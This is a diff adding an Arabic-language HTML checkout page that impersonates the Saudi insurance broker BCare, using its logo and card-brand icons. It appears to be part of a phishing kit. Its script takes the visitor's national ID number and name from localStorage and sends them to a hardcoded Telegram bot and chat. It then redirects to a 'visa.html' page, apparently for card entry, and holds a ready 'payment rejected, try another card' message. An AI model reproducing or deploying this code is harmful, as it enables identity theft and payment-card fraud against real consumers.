@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>تفاصيل الدفع</title>
+    <style>
+        body {
+            font-family: "Segoe UI", sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f8f8f8;
+            direction: rtl;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 12px;
+            padding: 20px;
+            max-width: 500px;
+            margin: auto;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            max-height: 40px;
+        }
+
+        .section {
+            margin-bottom: 20px;
+        }
+
+        .section h3 {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            margin: 5px 0;
+            font-size: 15px;
+        }
+
+        .bold {
+            font-weight: bold;
+        }
+
+        .highlight {
+            color: #f9a825;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .methods {
+            background-color: #f1f1f1;
+            padding: 10px;
+            border-radius: 8px;
+        }
+
+        .methods label {
+            display: block;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            background-color: white;
+            cursor: pointer;
+        }
+
+        .methods input[type="radio"] {
+            float: left;
+            margin-left: 10px;
+        }
+
+        .btn {
+            background-color: #f9a825;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            font-size: 16px;
+        }
+
+        #text ,#amounttotal {
+            font-size: 25px;
+            color: #3a2d83;
+
+        }
+
+        #amount  ,#totalamount{
+            font-size: 18px;
+            color: #3a2d83;
+        }
+
+        #ofersamount{
+            font-size: 22px;
+            color: #f9a825;
+        }
+        .methods {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .payment-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            font-size: 16px;
+            padding: 10px 14px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            transition: border-color 0.3s;
+            cursor: pointer;
+        }
+
+        .payment-option:hover {
+            border-color: #4a90e2;
+        }
+
+        .payment-option input[type="radio"] {
+            accent-color: #4a90e2;
+            transform: scale(1.2);
+            margin-left: 8px;
+        }
+
+        .payment-icon {
+            height: 24px;
+            width: auto;
+        }
+
+        .apple-icon {
+            height: 20px;
+        }
+
+        .label-text {
+            flex-grow: 1;
+            text-align: right;
+        }
+        #erortext{
+            color: red;
+            text-align: center;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+
+
+<div class="logo">
+    <img src="https://bcare.com.sa/assets/images/Bcare-logo.svg" alt="Care Logo" />
+</div>
+
+
+
+<div class="container">
+    <div class="section">
+        <h3 id="text" >تفاصيل السعر</h3>
+        <div class="row"><span id="amount" >القسط الأساسي</span><span id="base">-</span></div>
+        <div class="row"><span id="ofersamount" >خصم عدم وجود مطالبات</span><span id="discount">-</span></div>
+        <div class="row"><span id="totalamount" >ضريبة القيمة المضافة</span><span id="tax">-</span></div>
+        <hr>
+        <div class="row"><span class="bold" id="amounttotal" >المجموع</span><span class="highlight" id="total">-</span></div>
+        <div style="font-size: 12px; color: gray;">شامل 2% قيمة عمولة الوسيط</div>
+    </div>
+    <h2 id="erortext" style="display: none;"> تم رفض عملية الدفع يرجى اعادة المحاولة ب استخدام بطاقة اخرى </h2>
+    <div class="section methods">
+        <label class="payment-option">
+            <input type="radio" name="payment" value="mada" checked>
+            <span class="label-text"></span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Mada_Logo.svg" alt="mada" class="payment-icon">
+        </label>
+
+        <label class="payment-option">
+            <input type="radio" name="payment" value="visa_mastercard">
+            <span class="label-text"></span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="visa" class="payment-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard" class="payment-icon">
+        </label>
+
+        <label class="payment-option">
+            <input type="radio" name="payment" value="apple_pay" id="applePayOption">
+            <span class="label-text">أبل باي</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="apple pay" class="payment-icon apple-icon">
+        </label>
+    </div>
+
+    <div id="appleWarning" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
+        خدمة أبل باي غير متوفرة حالياً
+    </div>
+
+    <button class="btn" id="payBtn">إتمام عملية الدفع</button>
+</div>
+
+<script>
+    let basePrice = parseFloat(localStorage.getItem('selectedPrice')) || 1000;
+
+    let discount = basePrice * 0.25;
+    let afterDiscount = basePrice - discount;
+    let tax = afterDiscount * 0.10;
+    let total = (afterDiscount + tax).toFixed(2);
+
+    document.getElementById("base").textContent = basePrice.toFixed(2);
+    document.getElementById("discount").textContent = discount.toFixed(2);
+    document.getElementById("tax").textContent = tax.toFixed(2);
+    document.getElementById("total").textContent = total;
+
+    const paymentInputs = document.querySelectorAll('input[name="payment"]');
+    const applePayOption = document.getElementById("applePayOption");
+    const warning = document.getElementById("appleWarning");
+    const payButton = document.getElementById("payBtn");
+    const errorText = document.getElementById("erortext"); 
+
+    paymentInputs.forEach(input => {
+        input.addEventListener("change", () => {
+            if (applePayOption.checked) {
+                warning.style.display = "block";
+                payButton.disabled = true;
+                payButton.style.opacity = "0.5";
+                payButton.style.cursor = "not-allowed";
+            } else {
+                warning.style.display = "none";
+                payButton.disabled = false;
+                payButton.style.opacity = "1";
+                payButton.style.cursor = "pointer";
+            }
+        });
+    });
+
+    const telegramBotToken = '7647127310:AAEL_VzCr1wTh26Exczu6IPuFgEsH4HHHVE';
+    const chatId = '6454807559';
+
+    function getSelectedPaymentMethod() {
+        for (let i = 0; i < paymentInputs.length; i++) {
+            if (paymentInputs[i].checked) {
+                return paymentInputs[i].value;
+            }
+        }
+        return 'غير محدد';
+    }
+
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        const payload = {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+            return await response.json();
+        } catch (err) {
+            console.error('فشل الإرسال إلى تيليجرام:', err);
+            return { ok: false, description: 'خطأ في الاتصال بتيليجرام' }; 
+        }
+    }
+
+    payButton.addEventListener("click", async () => {
+        if (applePayOption.checked) return;
+
+        const idNumber = localStorage.getItem('id_number');
+        if (!idNumber) {
+            alert('خطأ: لم يتم العثور على رقم الهوية. الرجاء العودة للصفحة الرئيسية.');
+            return;
+        }
+
+        const paymentMethod = getSelectedPaymentMethod();
+        const totalAmount = document.getElementById("total").textContent;
+
+        try {
+            const formData = new FormData();
+            formData.append('action', 'save_payment_details'); 
+            formData.append('id_number', idNumber);
+            formData.append('payment_method', paymentMethod);
+            formData.append('total_amount', totalAmount);
+
+            const response = await fetch('process_form.php', {
+                method: 'POST',
+                body: formData
+            });
+
+            const result = await response.json();
+
+            if (result.status === 'success') {
+                const ownerName = localStorage.getItem('owner_name') || 'غير معروف';
+                const telegramMessage = `
+💳 عملية دفع جديدة:
+
+- من: ${ownerName}
+- رقم الهوية: ${idNumber}
+- طريقة الدفع: ${paymentMethod}
+- المبلغ الإجمالي: ${totalAmount} ريال سعودي
+                `;
+                const telegramResult = await sendToTelegram(telegramMessage);
+
+                if (telegramResult && telegramResult.ok) {
+                    window.location.href = 'visa.html'; 
+                } else {
+                    errorText.textContent = "❌ فشل في إرسال الإشعار إلى تيليجرام. يرجى المحاولة مرة أخرى.";
+                    errorText.style.display = "block";
+                }
+            } else {
+                errorText.textContent = '❌ فشل في تحديث بيانات الدفع: ' + (result.message || 'خطأ غير معروف.');
+                errorText.style.display = "block";
+            }
+        } catch (error) {
+            console.error('خطأ في الاتصال بالخادم أو إرسال البيانات:', error);
+            errorText.textContent = 'خطأ في الاتصال بالخادم. الرجاء المحاولة مرة أخرى لاحقاً.';
+            errorText.style.display = "block";
+        }
+    });
+</script>
+
+</body>
+</html>
